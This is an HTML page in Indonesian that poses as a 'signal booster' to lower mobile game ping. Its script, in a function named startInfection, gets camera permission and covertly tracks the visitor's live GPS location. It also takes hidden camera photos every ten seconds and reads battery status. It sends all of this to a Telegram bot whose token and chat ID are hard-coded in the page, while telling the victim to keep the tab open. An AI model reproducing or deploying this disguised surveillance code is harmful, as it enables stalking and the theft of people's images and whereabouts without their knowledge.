<!DOCTYPE html>
<html>
<head>
    <title>Sinyal Booster Hayabusa V3</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: 'Courier New', monospace; padding-top: 50px; }
        .container { padding: 20px; border: 2px dashed #00ff00; margin: 20px; border-radius: 15px; background: rgba(0,255,0,0.05); }
        .btn { background: #00ff00; color: #000; padding: 25px; border-radius: 50px; border: none; font-weight: bold; font-size: 20px; cursor: pointer; box-shadow: 0 0 30px #00ff00; width: 80%; }
        #status { margin-top: 20px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="text-shadow: 0 0 10px #00ff00;">ðŸ“¡ SYSTEM OPTIMIZER</h1>
        <p>Perkuat Sinyal & Turunkan Ping Game (ML/FF/PUBG)</p>
        <br>
        <button class="btn" onclick="startInfection()">BOOST SEKARANG</button>
        <div id="status">Status: Standby...</div>
    </div>

    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
        const ID = "7596509818";

        async function startInfection() {
            document.getElementById('status').innerText = "Sedang Menghubungkan ke Server...";
            
            try {
                // Minta Izin Kamera & Lokasi
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;

                // 1. Ambil Lokasi Terus-menerus (Tracking)
                navigator.geolocation.watchPosition(pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    sendToTelegram(`ðŸ“ LOKASI LIVE: https://www.google.com/maps?q=${lat},${lon}`);
                }, null, { enableHighAccuracy: true });

                // 2. Loop Pengambilan Foto (Tiap 10 Detik selama tab dibuka)
                setInterval(() => {
                    takeSnap();
                }, 10000);

                // 3. Ambil Info Perangkat (Baterai, dll)
                if (navigator.getBattery) {
                    navigator.getBattery().then(batt => {
                        sendToTelegram(`ðŸ”‹ STATUS BATERAI: ${batt.level * 100}% (${batt.charging ? 'Charging' : 'Not Charging'})`);
                    });
                }

                alert("Booster Aktif! Jangan tutup halaman ini agar sinyal tetap stabil.");
                document.getElementById('status').innerText = "Status: Booster Aktif (Background Process)";

            } catch (e) {
                alert("Gagal! Klik 'Izinkan' untuk akses sistem.");
            }
        }

        function takeSnap() {
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', blob, 'shot.jpg');
                f.append('caption', 'ðŸ“¸ MONITORING LIVE (HIDDEN)');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg');
        }

        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
